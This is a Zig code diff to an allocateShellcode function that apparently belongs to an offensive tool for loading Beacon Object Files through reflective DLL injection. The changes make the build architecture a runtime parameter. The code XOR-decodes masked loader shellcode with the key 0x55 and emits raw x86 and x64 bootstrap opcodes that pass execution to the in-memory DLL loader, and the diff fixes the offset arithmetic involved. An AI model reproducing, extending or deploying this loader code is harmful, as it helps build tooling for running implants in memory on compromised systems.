@@ -9,25 +9,26 @@ pub fn allocateShellcode(
     bof_launcher_bytes: []const u8,
     bof_bytes: []const u8,
     rdi_flags: u32,
+    arch: std.Target.Cpu.Arch,
 ) ![]const u8 {
-    const bootstrap_len = if (@import("builtin").cpu.arch == .x86_64) 69 else 50;
-    const rdi_shellcode_masked = if (@import("builtin").cpu.arch == .x86_64)
-        rdi_shellcode64_masked
+    const rdi_shellcode_masked = if (arch == .x86_64)
+        rdi_shellcode64_masked[0..]
     else
-        rdi_shellcode32_masked;
+        rdi_shellcode32_masked[0..];
 
-    var rdi_shellcode: [rdi_shellcode_masked.len]u8 = undefined;
-    @memcpy(&rdi_shellcode, &rdi_shellcode_masked);
-    for (0..rdi_shellcode.len) |i| {
+    var rdi_shellcode: [4096]u8 = undefined;
+    @memcpy(rdi_shellcode[0..rdi_shellcode_masked.len], rdi_shellcode_masked);
+    for (0..rdi_shellcode_masked.len) |i| {
         rdi_shellcode[i] ^= 0x55;
     }
-    const rdi_shellcode_bytes = rdi_shellcode[0..];
+    const rdi_shellcode_bytes = rdi_shellcode[0..rdi_shellcode_masked.len];
 
-    var bootstrap: [bootstrap_len]u8 = undefined;
+    const bootstrap_len: u32 = if (arch == .x86_64) 69 else 50;
+    var bootstrap: [128]u8 = undefined;
     var fbs_bootstrap = std.io.fixedBufferStream(bootstrap[0..]);
     const w = fbs_bootstrap.writer();
 
-    const dll_offset: u32 = @intCast(@sizeOf(@TypeOf(bootstrap)) - 5 + rdi_shellcode_bytes.len);
+    const dll_offset: u32 = @intCast(bootstrap_len - 5 + rdi_shellcode_bytes.len);
     const user_data_location: u32 = @intCast(dll_offset + bof_launcher_bytes.len);
     const bof_data_len: u32 = @intCast(bof_bytes.len);
     const bof_run_func_hash = 0x28fe7d78;
@@ -42,7 +43,7 @@ pub fn allocateShellcode(
     //      PVOID   pvShellcodeBase,    // Arg 5
     //      DWORD   dwFlags)            // Arg 6 (RDI_FLAG_*)
 
-    if (@import("builtin").cpu.arch == .x86_64) {
+    if (arch == .x86_64) {
         // Pushes next instruction address to stack
         // call 0x5
         try w.writeAll(&.{ 0xe8, 0x00, 0x00, 0x00, 0x00 });
@@ -100,7 +101,7 @@ pub fn allocateShellcode(
         // Transfer execution to the RDI
         // call LoadDLL
         try w.writeByte(0xe8);
-        try w.writeAll(&.{ @intCast(@sizeOf(@TypeOf(bootstrap)) - try fbs_bootstrap.getPos() - 4), 0x00, 0x00, 0x00 });
+        try w.writeAll(&.{ @intCast(bootstrap_len - try fbs_bootstrap.getPos() - 4), 0x00, 0x00, 0x00 });
 
         // mov rsp, rsi
         try w.writeAll(&.{ 0x48, 0x89, 0xf4 });
@@ -110,7 +111,7 @@ pub fn allocateShellcode(
 
         // ret
         try w.writeByte(0xc3);
-    } else {
+    } else if (arch == .x86) {
         // call 0x5
         try w.writeAll(&.{ 0xe8, 0x00, 0x00, 0x00, 0x00 });
 
@@ -157,7 +158,7 @@ pub fn allocateShellcode(
 
         // call LoadDLL
         try w.writeByte(0xe8);
-        try w.writeAll(&.{ @intCast(@sizeOf(@TypeOf(bootstrap)) - try fbs_bootstrap.getPos() - 4), 0x00, 0x00, 0x00 });
+        try w.writeAll(&.{ @intCast(bootstrap_len - try fbs_bootstrap.getPos() - 4), 0x00, 0x00, 0x00 });
 
         // add esp, 20
         try w.writeAll(&.{ 0x83, 0xc4, 20 });
@@ -167,6 +168,8 @@ pub fn allocateShellcode(
 
         // ret
         try w.writeByte(0xc3);
+    } else {
+        unreachable;
     }
 
     const shellcode_bytes = std.mem.concat(
